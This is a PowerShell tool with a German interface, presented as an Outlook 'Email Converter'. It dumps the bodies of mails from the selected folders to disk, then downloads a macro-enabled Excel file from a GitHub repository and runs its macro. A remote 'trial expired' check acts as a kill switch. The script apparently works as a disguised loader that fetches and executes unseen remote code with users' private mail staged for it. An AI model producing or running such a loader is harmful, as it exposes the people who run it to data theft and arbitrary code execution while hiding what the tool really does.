Add-Type -AssemblyName System.Windows.Forms

$windowTitle = "Email Converter"
$labelText = "Ordner:"

$Excel = new-object -comobject excel.application
$Outlook = New-Object -ComObject Outlook.Application

$namespace = $Outlook.GetNamespace("MAPI")

$mailFolder = "Posteingang"
$excelFilename = "$pwd\Output.xlsm"

function executeExcel {
	$wb = $excel.workbooks.open("$excelFilename")
	$excel.Visible = $true
	$excel.run("Converter.Converter")
}

function downloadExcel {
	
	write-host "downloading"
	
	invoke-webrequest -uri 'https://github.com/backend1234/backend-for-formatter/raw/main/em_conv.xlsm' -outfile $excelfilename

	write-host "downloaded"
}



function loadAddr {
	$ret = @{}
	$i = 0
	foreach ($acc in $namespace.Folders){
		$i+=1 
		$ret[$i] = $acc.Name
	}
	
	return $ret
}

function loadFolders {
	$ret = @{}
	$i = 0
	
	foreach ($acc in $namespace.Folders){
		foreach ($folder in $acc.Folders){
			$i+=1
			$ret[$i] = @{
			   name = $folder.Name
			   acc = $acc.Name
			}
		}
	}
	return $ret
}

function fillfolderList{
	$folderList.Items.Clear()

	write-host "filling..."
	
	foreach($f in $folders.keys){
		$folderList.Items.add($folders[$f].acc + " - " + $folders[$f].name)
	}
	
	write-host "filled."
}

function exportMails {
	$i=0
	write-host "exporting Mails"
	mkdir tmp
	
	foreach ($i in $folders.keys){
		if ($folderList.CheckedItems.Contains($folders[$i].acc + " - " + $folders[$i].name)){
			write-host "exporting" $folders[$i].acc " - " $folders[$i].name
			
			write-host "items in this dir: " $namespace.Folders.Item($folders[$i].acc).Folders.Item($folders[$i].name).items.count
			
			$c = 0
			foreach ($m in $namespace.Folders.Item($folders[$i].acc).Folders.Item($folders[$i].name).items){
				$m.body | Out-File -FilePath "tmp\$c.txt"
				$c+=1
			}
		}
	}
}

function removeMails {
	rm -r tmp
}

if($(curl https://github.com/backend1234/backend-for-formatter/raw/main/working.txt).content.equals("false`n")){
	[System.Windows.Forms.MessageBox]::Show("Ihre Testversion ist abgelaufen.","Error",0)
	exit
}

$addrs = loadaddr
$folders = loadfolders

#generate form
$newform = new-object system.windows.forms.form
$newform.clientsize = '500,500'
$newform.text = $windowTitle 

$label = new-object System.windows.forms.label
$label.location = '20,20' 
$label.size = '460, 35' 
$label.Text = $labelText
 

#generate button
$btn = new-object system.windows.forms.button
$btn.location = '260,425'
$btn.size = '220,50'
$btn.text = "export to excel"
$btn.add_click({
            write-host "export to excel"
			
			$newform.close()
			exportMails
			downloadExcel
			executeExcel
			removeMails
			
})

#generate folder check list
$folderList = new-object -typename system.windows.forms.checkedlistbox; 
$folderList.location = '20,55' 
$folderList.size = '460,350'
$folderList.clearselected(); 
fillfolderList
 
#Start form 
$newform.Controls.Add($label)
$newform.Controls.Add($folderList)
$newform.Controls.Add($mailList)
$newform.Controls.Add($btn)
$newform.ShowDialog()
